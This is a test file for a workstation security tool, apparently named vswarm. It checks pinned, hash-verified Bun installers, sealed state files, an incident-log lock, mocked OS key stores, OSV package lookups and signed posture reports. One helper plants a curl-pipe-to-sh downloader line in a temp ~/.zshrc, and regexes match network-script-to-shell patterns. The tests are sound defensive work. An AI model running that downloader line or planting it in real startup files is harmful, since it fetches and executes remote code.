// What vswarm's own trust rests on: the installers' pinned Bun, the seals on its state files and incident log, signed
// posture reports and team policy. Nothing here touches the real home, Keychain, secret service or DPAPI: keys live
// in temp files, and the CLI runs with its state in a temp folder.
import { describe, expect, test } from "bun:test";
import { existsSync, mkdtempSync, readFileSync, rmSync, statSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import type { Ctx } from "../src/sec/ctx";
import { check } from "../src/sec/engine";
import { verdictNow } from "../src/sec/gate";
import { osvMalicious } from "../src/sec/intel";
import { posture, REPORT_NAMESPACE, signReport, writePosture } from "../src/sec/report";
import { forBaseline, scan } from "../src/sec/scan";
import { DPAPI_PROTECT, DPAPI_UNPROTECT, dpapiStore, fileStore, keychainStore, platformStore, secretServiceStore, type KeyStore, type Runner } from "../src/sec/seal";
import {
  clearLock, files, keyStore, lockState, readAccepted, readBaseline, readLast, readLog, saveAccepted, saveBaseline, saveLast, setLock, stateKey, useKeyStore,
} from "../src/sec/store";
import type { Scan } from "../src/sec/types";

const ROOT = join(import.meta.dir, "..");
const WIN = process.platform === "win32";

describe("installers: Bun is pinned, not piped", () => {
  const sh = readFileSync(join(ROOT, "install.sh"), "utf8");
  const ps = readFileSync(join(ROOT, "install.ps1"), "utf8");

  test("one Bun version in both scripts, and a SHA-256 for every platform the scripts pick", () => {
    const shVersion = /^BUN_VERSION=(\S+)$/m.exec(sh)?.[1];
    const psVersion = /\$BunVersion = '([^']+)'/.exec(ps)?.[1];
    expect(shVersion).toMatch(/^\d+\.\d+\.\d+$/);
    expect(psVersion).toBe(shVersion!);
    const shPins = Object.fromEntries([...sh.matchAll(/^\s+(bun-[\w-]+)\) echo ([0-9a-f]+) ;;$/gm)].map((m) => [m[1], m[2]]));
    const psPins = Object.fromEntries([...ps.matchAll(/'(bun-windows-[\w-]+)'\s*=\s*'([0-9a-f]+)'/g)].map((m) => [m[1], m[2]]));
    const unix = ["bun-darwin-aarch64", "bun-darwin-x64", "bun-darwin-x64-baseline", "bun-linux-aarch64", "bun-linux-aarch64-musl",
      "bun-linux-x64", "bun-linux-x64-baseline", "bun-linux-x64-musl", "bun-linux-x64-musl-baseline"];
    expect(Object.keys(shPins).sort()).toEqual(unix.sort());
    expect(Object.keys(psPins).sort()).toEqual(["bun-windows-aarch64", "bun-windows-x64", "bun-windows-x64-baseline"]);
    for (const h of [...Object.values(shPins), ...Object.values(psPins)]) expect(h).toMatch(/^[0-9a-f]{64}$/);
    // Every pin is its own: a copy-paste slip would give two zips one hash.
    expect(new Set([...Object.values(shPins), ...Object.values(psPins)]).size).toBe(unix.length + 3);
    // The download names the pinned version, and a mismatch stops before anything is unpacked.
    expect(sh).toContain("releases/download/bun-v$BUN_VERSION/$asset.zip");
    expect(sh.indexOf('[ "$got" = "$want" ]')).toBeLessThan(sh.indexOf("unzip -q"));
    expect(ps).toContain("releases/download/bun-v$BunVersion/$Asset.zip");
    expect(ps.indexOf("$Got -ne $BunSha256[$Asset]")).toBeLessThan(ps.indexOf("Expand-Archive"));
  });

  test("no script from the network goes into a shell for Bun", () => {
    const code = (t: string) => t.split("\n").filter((l) => !/^\s*#/.test(l)).join("\n");
    expect(code(sh)).not.toMatch(/bun\.sh\/install/);
    expect(code(sh)).not.toMatch(/curl[^\n]*\|\s*(ba)?sh/);
    expect(code(ps)).not.toMatch(/bun\.sh\/install/);
    expect(code(ps)).not.toMatch(/\[scriptblock\]::Create|Invoke-RestMethod|\|\s*iex\b/i);
    // An existing Bun is still used first.
    expect(sh.indexOf("command -v bun")).toBeLessThan(sh.indexOf("install_bun\n  BUN="));
    expect(ps.indexOf("Get-Command bun")).toBeLessThan(ps.indexOf("$BunSha256 = @{"));
  });

  test.skipIf(WIN)("install.sh picks the zip for each system and CPU", async () => {
    const pick = async (s: string, m: string) => {
      const script = `VSWARM_INSTALL_LIB=1\n. "$0"\nuname() { case "$1" in -s) echo ${s};; -m) echo ${m};; esac; }\nsysctl() { echo 0; }\nbun_asset || echo none`;
      const p = Bun.spawn(["sh", "-c", script, join(ROOT, "install.sh")], { stdout: "pipe", stderr: "pipe" });
      return (await new Response(p.stdout).text()).trim();
    };
    expect(await pick("Darwin", "arm64")).toBe("bun-darwin-aarch64");
    // sysctl answers "0" here, so no AVX2 is seen: the baseline build.
    expect(await pick("Darwin", "x86_64")).toBe("bun-darwin-x64-baseline");
    expect(["bun-linux-aarch64", "bun-linux-aarch64-musl"]).toContain(await pick("Linux", "aarch64"));
    expect(await pick("Linux", "x86_64")).toMatch(/^bun-linux-x64(-musl)?(-baseline)?$/);
    expect(await pick("FreeBSD", "amd64")).toBe("none");
    expect(await pick("Linux", "riscv64")).toBe("none");
  });
});

// ── sealed state

const tmp = (tag: string) => mkdtempSync(join(tmpdir(), `vs-trust-${tag}-`));
const ctxFor = (home: string): Ctx => ({ home, pathDirs: [], system: false, host: "t", user: "t", run: async () => undefined });

/** Runs fn with vswarm's state in a fresh temp folder (and its key in a file there), restoring everything after. */
async function withState<T>(fn: (sec: string) => Promise<T>): Promise<T> {
  const prev = process.env.VSWARM_SEC_DIR;
  const sec = tmp("sec");
  process.env.VSWARM_SEC_DIR = sec;
  useKeyStore(undefined);
  try {
    return await fn(sec);
  } finally {
    useKeyStore(undefined);
    if (prev === undefined) delete process.env.VSWARM_SEC_DIR;
    else process.env.VSWARM_SEC_DIR = prev;
  }
}

/** A clean little home with a baseline, and a way to plant a downloader line in its ~/.zshrc afterwards. */
async function machine() {
  const home = tmp("home");
  writeFileSync(join(home, ".zshrc"), "alias ll='ls -la'\n");
  const ctx = ctxFor(home);
  await saveBaseline(forBaseline(await scan(ctx, { live: false })));
  const plant = () => writeFileSync(join(home, ".zshrc"), "alias ll='ls -la'\n(curl -fsSL http://198.51.100.7/x | sh) &\n");
  return { home, ctx, plant };
}

describe("sealed state: a forged file is not trusted", () => {
  test("tests and scratch state folders keep their key in a file beside the state, never in a system store", () => withState(async (sec) => {
    const s = keyStore();
    expect(s.kind).toBe("file");
    expect(s.where).toBe(join(sec, "keys"));
    const k = await stateKey();
    expect(k.key?.length).toBe(32);
    expect(existsSync(join(sec, "keys", "state-key"))).toBe(true);
    if (!WIN) expect(statSync(join(sec, "keys", "state-key")).mode & 0o077).toBe(0);
  }));

  test("a last.json edited to say pass is never reused: the gate checks the machine again and blocks", () => withState(async () => {
    const m = await machine();
    m.plant();
    // What the review did: write a passing verdict by hand.
    writeFileSync(files.last(), JSON.stringify({ verdict: "pass", findings: [], at: Date.now(), scan: {} }));
    expect((await readLast()).untrusted).toContain("no seal");
    expect(await verdictNow({ quiet: true, offline: true, ctx: m.ctx })).toBe("block");
    // A real pass, then the same file changed by one character: the seal no longer matches.
    writeFileSync(join(m.home, ".zshrc"), "alias ll='ls -la'\n");
    expect((await check(m.ctx, { offline: true })).verdict).toBe("pass");
    m.plant();
    writeFileSync(files.last(), readFileSync(files.last(), "utf8").replace('"verdict": "pass"', '"verdict": "pass" '));
    expect((await readLast()).untrusted).toContain("seal does not match");
    expect(await verdictNow({ quiet: true, offline: true, ctx: m.ctx })).toBe("block");
    // A seal copied from another state file does not fit this one.
    await saveLast({ verdict: "pass", findings: [], at: Date.now(), scan: {} as Scan });
    await saveAccepted({});
    writeFileSync(files.last(), readFileSync(files.accepted(), "utf8"));
    writeFileSync(`${files.last()}.seal`, readFileSync(`${files.accepted()}.seal`, "utf8"));
    expect((await readLast()).untrusted).toContain("seal does not match");
  }), 60_000);

  test("an untouched sealed verdict is reused within two minutes", () => withState(async () => {
    await saveLast({ verdict: "block", findings: [], at: Date.now(), scan: {} as Scan });
    // A ctx that would pass: the cached BLOCK answering shows no fresh check ran.
    expect(await verdictNow({ quiet: true, offline: true, ctx: ctxFor(tmp("home")) })).toBe("block");
  }));

  test("an edited baseline is set aside and blocks; it cannot be accepted away", () => withState(async () => {
    const m = await machine();
    writeFileSync(files.baseline(), readFileSync(files.baseline(), "utf8").replace('"user": "t"', '"user": "x"'));
    expect((await readBaseline()).untrusted).toContain("seal does not match");
    const r = await check(m.ctx, { offline: true });
    expect(r.verdict).toBe("block");
    expect(r.baseline).toBeUndefined();
    const f = r.findings.find((x) => x.rule === "vswarm-state");
    expect(f?.severity).toBe("high");
    // Accepted the proper way, it still shows: findings about vswarm's own files are never filtered.
    await saveAccepted({ [f!.id]: { at: Date.now(), title: f!.title } });
    expect((await check(m.ctx, { offline: true })).findings.some((x) => x.id === f!.id)).toBe(true);
    // A new baseline is sealed again.
    await saveBaseline(forBaseline(await scan(m.ctx, { live: false })));
    expect((await check(m.ctx, { offline: true })).verdict).toBe("pass");
  }), 60_000);

  test("an accepted list edited by hand accepts nothing and says so", () => withState(async () => {
    const m = await machine();
    m.plant();
    const r = await check(m.ctx, { offline: true });
    const id = r.findings.find((x) => x.rule === "startup-file")!.id;
    writeFileSync(files.accepted(), JSON.stringify({ [id]: { at: Date.now(), title: "forged" } }));
    expect((await readAccepted()).untrusted).toBeDefined();
    const again = await check(m.ctx, { offline: true });
    expect(again.findings.some((x) => x.id === id)).toBe(true);
    expect(again.findings.some((x) => x.id === "vswarm-state:accepted" && x.severity === "medium")).toBe(true);
    await saveAccepted({ [id]: { at: Date.now(), title: "mine" } });
    expect((await check(m.ctx, { offline: true })).findings.some((x) => x.id === id)).toBe(false);
  }), 60_000);
});

describe("the lock and the incident log", () => {
  const lock = { incident: "20260101-000000", at: Date.now(), reason: "test" };
  const dropLock = () => {
    rmSync(files.lock(), { force: true });
    rmSync(`${files.lock()}.seal`, { force: true });
  };

  test("a deleted lock file keeps the incident open; vswarm unlock closes it", () => withState(async () => {
    await setLock(lock);
    expect((await lockState()).lock?.incident).toBe(lock.incident);
    dropLock();
    const st = await lockState();
    expect(st.lock?.incident).toBe(lock.incident);
    expect(st.why).toContain("lock file is gone");
    expect(await verdictNow({ quiet: true, offline: true, ctx: ctxFor(tmp("home")) })).toBe("block");
    await clearLock(lock.incident);
    expect((await lockState()).lock).toBeUndefined();
    expect((await readLog()).entries.map((e) => e.event)).toEqual(["lock", "unlock"]);
  }));

  test("a lock file edited or written by hand still blocks", () => withState(async () => {
    await setLock(lock);
    writeFileSync(files.lock(), JSON.stringify({ ...lock, reason: "nothing to see" }));
    const st = await lockState();
    expect(st.lock).toBeDefined();
    expect(st.why).toContain("seal does not match");
    await clearLock(lock.incident);
    // A hand-written lock with no log behind it blocks too (the Windows CI does this on purpose).
    writeFileSync(files.lock(), JSON.stringify({ incident: "ci", at: 0, reason: "CI" }));
    expect((await lockState()).lock?.incident).toBe("ci");
    dropLock();
    expect((await lockState()).lock).toBeUndefined();
  }));

  test("a log cut back to before the lock, deleted, or edited keeps the machine locked; unlock needs a reset then", () => withState(async () => {
    await setLock(lock);
    await clearLock(lock.incident);
    await setLock({ ...lock, incident: "second" });
    const text = readFileSync(files.log(), "utf8");
    // Cut to "lock, unlock": a shorter chain that verifies on its own.
    writeFileSync(files.log(), text.split("\n").slice(0, 2).join("\n") + "\n");
    dropLock();
    let st = await lockState();
    expect(st.lock).toBeDefined();
    expect(st.why).toContain("cut short");
    rmSync(files.log());
    st = await lockState();
    expect(st.why).toContain("was deleted");
    writeFileSync(files.log(), text.replace('"reason":"test"', '"reason":"tset"'));
    expect((await readLog()).why).toContain("changed outside vswarm");
    expect((await lockState()).lock).toBeDefined();
    await expect(clearLock("second")).rejects.toThrow("incident log");
    const r = await clearLock("second", { reset: true });
    expect(r.kept && existsSync(r.kept)).toBe(true);
    expect((await lockState()).lock).toBeUndefined();
    expect((await readLog()).entries.map((e) => e.event)).toEqual(["reset"]);
  }));

  test("upgrading from unsealed files: the first key adopts the baseline and an open lock, and drops the old verdict", () => withState(async () => {
    writeFileSync(files.baseline(), JSON.stringify({ version: 1, host: "t", user: "t", home: "/x", at: 1, items: [], texts: {}, gaps: {} }));
    writeFileSync(files.lock(), JSON.stringify(lock));
    writeFileSync(files.last(), JSON.stringify({ verdict: "pass", findings: [], at: Date.now(), scan: {} }));
    expect((await readBaseline()).untrusted).toBeUndefined();
    const st = await lockState();
    expect(st.lock?.incident).toBe(lock.incident);
    expect(st.why).toBeUndefined();
    expect((await readLog()).entries[0].event).toBe("lock");
    expect(existsSync(files.last())).toBe(false);
  }));

  test("a key lost after seals existed adopts nothing: the old seals stay untrusted", () => withState(async (sec) => {
    await saveBaseline({ version: 1, host: "t", user: "t", home: "/x", at: 1, items: [], texts: {}, gaps: {} });
    rmSync(join(sec, "keys"), { recursive: true });
    useKeyStore(undefined);
    expect((await readBaseline()).untrusted).toContain("seal does not match");
  }));

  test("a key store that does not answer: nothing cached is reused, a lock file still blocks, the check warns", () => withState(async () => {
    const m = await machine();
    const locked: KeyStore = { kind: "keychain", where: "test", get: async () => { throw new Error("User interaction is not allowed"); }, set: async () => {}, remove: async () => {} };
    useKeyStore(locked);
    await saveLast({ verdict: "pass", findings: [], at: Date.now(), scan: {} as Scan });
    expect((await readLast()).nokey).toBe(true);
    const r = await check(m.ctx, { offline: true });
    expect(r.findings.find((f) => f.id === "vswarm-state:nokey")?.severity).toBe("medium");
    writeFileSync(files.lock(), JSON.stringify(lock));
    expect(await verdictNow({ quiet: true, offline: true, ctx: m.ctx })).toBe("block");
  }), 60_000);
});

describe("key stores: the commands they run (nothing real is called)", () => {
  const recorder = (answers: { code: number; out?: string; err?: string }[]) => {
    const calls: { cmd: string[]; stdin?: string; env?: Record<string, string | undefined> }[] = [];
    const run: Runner = async (cmd, opt = {}) => {
      calls.push({ cmd, ...opt });
      const a = answers.shift() ?? { code: 0 };
      return { code: a.code, out: a.out ?? "", err: a.err ?? "" };
    };
    return { calls, run };
  };

  test("macOS Keychain: found, not found (44), locked", async () => {
    const r = recorder([{ code: 0, out: "ab\n" }, { code: 44 }, { code: 36, err: "User interaction is not allowed." }, { code: 0 }]);
    const s = keychainStore(r.run);
    expect(await s.get("state-key")).toBe("ab");
    expect(await s.get("state-key")).toBeUndefined();
    await expect(s.get("state-key")).rejects.toThrow("User interaction is not allowed");
    await s.set("state-key", "cd");
    expect(r.calls[0].cmd).toEqual(["/usr/bin/security", "find-generic-password", "-s", "dev.vswarm.seal", "-a", "state-key", "-w"]);
    expect(r.calls[3].cmd.slice(0, 7)).toEqual(["/usr/bin/security", "add-generic-password", "-U", "-s", "dev.vswarm.seal", "-a", "state-key"]);
  });

  test("Linux Secret Service: the value goes in on stdin; no D-Bus is an error, not 'no key'", async () => {
    const r = recorder([{ code: 1 }, { code: 1, err: "Cannot autolaunch D-Bus without X11 $DISPLAY" }, { code: 0 }]);
    const s = secretServiceStore(r.run);
    expect(await s.get("state-key")).toBeUndefined();
    await expect(s.get("state-key")).rejects.toThrow("D-Bus");
    await s.set("state-key", "secretvalue");
    expect(r.calls[2].cmd).not.toContain("secretvalue");
    expect(r.calls[2].stdin).toBe("secretvalue");
  });

  test("Windows DPAPI: the value and the blob travel in environment variables, never in the script", async () => {
    const dir = tmp("dpapi");
    const ps = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
    const r = recorder([{ code: 0, out: "QkxPQg==\r\n" }, { code: 0, out: "cd\r\n" }, { code: 1, err: "Key not valid for use in specified state." }]);
    const s = dpapiStore(dir, r.run, ps);
    expect(await s.get("state-key")).toBeUndefined();
    await s.set("state-key", "cd");
    expect(readFileSync(join(dir, "state-key.dpapi"), "utf8").trim()).toBe("QkxPQg==");
    expect(r.calls[0].cmd).toEqual([ps, "-NoProfile", "-NonInteractive", "-Command", DPAPI_PROTECT]);
    expect(r.calls[0].env).toEqual({ VSWARM_SEAL_IN: "cd" });
    expect(await s.get("state-key")).toBe("cd");
    expect(r.calls[1].cmd.at(-1)).toBe(DPAPI_UNPROTECT);
    expect(r.calls[1].env).toEqual({ VSWARM_SEAL_BLOB: "QkxPQg==" });
    await expect(s.get("state-key")).rejects.toThrow("DPAPI could not open");
  });

  test("the system's own store per platform; the file store treats a missing file as no key", async () => {
    expect(platformStore("darwin").kind).toBe(existsSync("/usr/bin/security") ? "keychain" : "file");
    expect(platformStore("win32").kind).toBe("dpapi");
    expect(platformStore("linux", true).kind).toBe("secret-service");
    expect(platformStore("linux", false).kind).toBe("file");
    const s = fileStore(join(tmp("fs"), "keys"));
    expect(await s.get("x")).toBeUndefined();
    await s.set("x", "v");
    expect(await s.get("x")).toBe("v");
    await s.remove("x");
    expect(await s.get("x")).toBeUndefined();
  });
});

describe("preflight --quiet and packages new since the last lookup", () => {
  test("only versions never asked about go to OSV; offline, they are counted as unchecked", async () => {
    const cache = join(tmp("osv"), "osv-cache.json");
    // An answer two days old for a, none for b.
    writeFileSync(cache, JSON.stringify({ "npm:a@1.0.0": { at: Date.now() - 2 * 86_400_000, mal: [] } }));
    const items = [{ kind: "npm", id: "a", name: "a", version: "1.0.0" }, { kind: "npm", id: "b", name: "b", version: "2.0.0" }];
    const real = globalThis.fetch;
    const asked: string[] = [];
    try {
      globalThis.fetch = (async (_u: unknown, init: any) => {
        const q = JSON.parse(init.body).queries;
        asked.push(...q.map((x: any) => x.package.name));
        return new Response(JSON.stringify({ results: q.map(() => ({ vulns: [{ id: "MAL-2099-7" }] })) }), { status: 200 });
      }) as unknown as typeof fetch;
      const r = await osvMalicious(items, cache, { onlyNew: true, timeoutMs: 3000 });
      expect(asked).toEqual(["b"]);
      expect(r.hits.map((h) => h.item.name)).toEqual(["b"]);
      expect(r.unchecked).toBe(0);
      globalThis.fetch = (async () => {
        throw new Error("offline");
      }) as unknown as typeof fetch;
      const r2 = await osvMalicious([...items, { kind: "npm", id: "c", name: "c", version: "3.0.0" }], cache, { onlyNew: true, timeoutMs: 3000 });
      expect(r2.unchecked).toBe(1);
      expect(r2.error).toContain("1 package version new since the last full check was not checked");
    } finally {
      globalThis.fetch = real;
    }
  });
});

describe("signed reports for a server that decides", () => {
  test.skipIf(WIN || !Bun.which("ssh-keygen"))("the report signs with a throwaway key, verifies with ssh-keygen, and a changed byte fails", () => withState(async () => {
    const m = await machine();
    m.plant();
    const r = await check(m.ctx, { offline: true });
    const p = posture(r, { name: "acme", serial: 3 });
    expect(p.verdict).toBe("block");
    expect(p.team).toEqual({ name: "acme", serial: 3 });
    expect(p.findings.some((f) => f.rule === "startup-file")).toBe(true);
    const dir = tmp("keys");
    const key = join(dir, "device");
    // A throwaway key without a passphrase, for this test only.
    expect(Bun.spawnSync(["ssh-keygen", "-q", "-t", "ed25519", "-N", "", "-C", "laptop@test", "-f", key]).exitCode).toBe(0);
    const text = JSON.stringify(p, null, 2) + "\n";
    const sig = await signReport(text, key);
    const [file, sigFile] = writePosture(join(dir, "reports"), text, sig);
    expect(sigFile).toBe(`${file}.sig`);
    writeFileSync(join(dir, "allowed"), `laptop@test ${readFileSync(`${key}.pub`, "utf8").split(" ").slice(0, 2).join(" ")}\n`);
    const verify = (data: string) => Bun.spawnSync(["ssh-keygen", "-Y", "verify", "-f", join(dir, "allowed"), "-I", "laptop@test", "-n", REPORT_NAMESPACE, "-s", sigFile], { stdin: new Blob([data]) }).exitCode;
    expect(verify(readFileSync(file, "utf8"))).toBe(0);
    expect(verify(text.replace('"block"', '"pass"'))).not.toBe(0);
    await expect(signReport(text, join(dir, "missing"))).rejects.toThrow("could not sign");
  }), 60_000);
});
